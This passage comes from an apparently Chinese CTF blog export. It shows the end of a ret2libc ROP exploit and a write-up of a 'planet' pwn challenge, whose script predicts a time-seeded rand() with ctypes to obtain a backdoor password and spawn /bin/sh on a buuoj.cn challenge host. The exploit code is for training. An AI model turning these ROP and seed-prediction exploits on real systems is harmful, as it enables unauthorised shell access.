keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n\\n[+] the write addrees is %#x'</span><span class=\"token operator\">%</span>write_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        by<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b read'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>libcbase <span class=\"token operator\">=</span> write_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"planet\"><a class=\"markdownIt-Anchor\" href=\"#planet\">#</a> planet</h2>\n<p>random cdll</p>\n<h3 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h3>\n<p>程序大概是一个模拟星际旅行的程序。其中，星球之间利用链表管理。有个类似菜单的功能函数，其中包括后门函数。星球名称和后门函数的验证密码均用随机数模 26 然后从字母表中选值。</p>\n<p><img data-src=\"./image-20231031230422500.png\" alt=\"image-20231031230422500\"></p>\n<h3 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h3>\n<p>与 week1 的 random 思路相同。</p>\n<p>程序利用 <code>time(0)</code>  作为随机数种子，因此利用 cdll 库函数，在程序执行 <code>srand(time(0))</code>  时同步执行，即可获得与之相同的随机种子。</p>\n<p>先生成 <code>11*5=55</code>  个随机数，对应 11 课星球的名称。然后接下来的 30 位即为后门函数的密码。调用后门函数，输入计算出来的密码，直接 getshell。</p>\n<p><img data-src=\"./image-20231031231206354.png\" alt=\"image-20231031231206354\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29021</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token string\">b'secret_passwd_anti_bad_guys'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Passwd: '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token operator\">*</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'What is your next move? (Help)\\n>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'Admin'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    payload <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">97</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Insert the secret passwd\\n> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the passwd is: '</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'The command to exec\\n> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "random",
                "cdll",
                "侧信道攻击",
                "时间差",
                "full RELRO",
                "brop"
            ]
        }
    ]
}